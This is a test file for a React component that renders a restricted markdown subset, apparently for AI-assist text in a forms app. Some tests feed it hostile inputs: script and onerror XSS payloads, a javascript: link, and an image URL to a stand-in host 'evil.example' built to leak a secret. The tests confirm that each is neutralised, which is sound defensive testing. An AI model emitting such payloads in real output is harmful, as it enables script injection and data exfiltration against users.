import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { parseInline } from "@/lib/forms/assist-markdown";

import { AssistMarkdown } from "./assist-markdown";

function renderMd(text: string): HTMLElement {
  return render(<AssistMarkdown text={text} />).container;
}

describe("AssistMarkdown, the safe subset", () => {
  it("renders paragraphs and line breaks", () => {
    const root = renderMd("First line\nsecond line\n\nNext paragraph");
    const paragraphs = root.querySelectorAll("p");
    expect(paragraphs).toHaveLength(2);
    expect(paragraphs[0]?.querySelectorAll("br")).toHaveLength(1);
    expect(paragraphs[1]?.textContent).toBe("Next paragraph");
  });

  it("renders bold, italic and inline code, so no literal backticks or asterisks remain", () => {
    const root = renderMd("Use **bold**, *italic* and `q_vehicle_make` here.");
    expect(root.querySelector("strong")?.textContent).toBe("bold");
    expect(root.querySelector("em")?.textContent).toBe("italic");
    expect(root.querySelector("code")?.textContent).toBe("q_vehicle_make");
    expect(root.textContent).toBe("Use bold, italic and q_vehicle_make here.");
  });

  it("never italicises inside an identifier", () => {
    const root = renderMd("Pinned q_vehicle_make_v2 and opt_yes_no.");
    expect(root.querySelector("em")).toBeNull();
    expect(root.textContent).toBe("Pinned q_vehicle_make_v2 and opt_yes_no.");
  });

  it("renders bullet and numbered lists, keeping a numbered list's start", () => {
    const root = renderMd("Steps:\n- one\n- two\n\n3. three\n4. four");
    expect(root.querySelectorAll("ul > li")).toHaveLength(2);
    const ordered = root.querySelector("ol");
    expect(ordered?.getAttribute("start")).toBe("3");
    expect(ordered?.querySelectorAll("li")).toHaveLength(2);
  });

  it("renders a fenced block as monospace text", () => {
    const root = renderMd('```json\n{ "a": 1 }\n```');
    expect(root.querySelector("pre code")?.textContent).toBe('{ "a": 1 }');
  });

  it("shows raw HTML and script as text, never as elements", () => {
    const root = renderMd('<script>alert(1)</script> <b>hi</b> <img src="x" onerror="alert(2)">');
    expect(root.querySelector("script")).toBeNull();
    expect(root.querySelector("b")).toBeNull();
    expect(root.querySelector("img")).toBeNull();
    expect(root.textContent).toContain("<script>alert(1)</script>");
    expect(root.innerHTML).not.toContain("<script>");
  });

  it("drops an image to its alt text, with no URL anywhere in the output", () => {
    const root = renderMd("Look ![a chart](https://evil.example/leak?d=secret) here");
    expect(root.querySelector("img")).toBeNull();
    expect(root.textContent).toBe("Look a chart here");
    expect(root.innerHTML).not.toContain("evil.example");
  });

  it("renders a link as its text only, never as an anchor", () => {
    const root = renderMd("See [the **docs**](javascript:alert(1)) and [home](/forms).");
    expect(root.querySelector("a")).toBeNull();
    expect(root.querySelector("strong")?.textContent).toBe("docs");
    expect(root.textContent).toBe("See the docs and home.");
    expect(root.innerHTML).not.toContain("javascript");
  });

  it("turns a heading into a bold paragraph rather than a heading element", () => {
    const root = renderMd("## Summary\nText");
    expect(root.querySelector("h1, h2, h3, h4, h5, h6")).toBeNull();
    expect(root.querySelector("strong")?.textContent).toBe("Summary");
  });

  it("leaves an unclosed marker as text, which is how a half-streamed span looks", () => {
    expect(parseInline("a **half")).toEqual([{ kind: "text", text: "a **half" }]);
    expect(parseInline("tick ` alone")).toEqual([{ kind: "text", text: "tick ` alone" }]);
  });

  it("honours a backslash escape", () => {
    expect(parseInline("\\*not italic\\*")).toEqual([{ kind: "text", text: "*not italic*" }]);
  });

  it("places trailing content at the end of the last block", () => {
    const { container } = render(
      <AssistMarkdown text={"- a\n- b"} trailing={<span data-testid="caret" />} />,
    );
    expect(container.querySelector("li:last-child [data-testid='caret']")).not.toBeNull();
  });
});
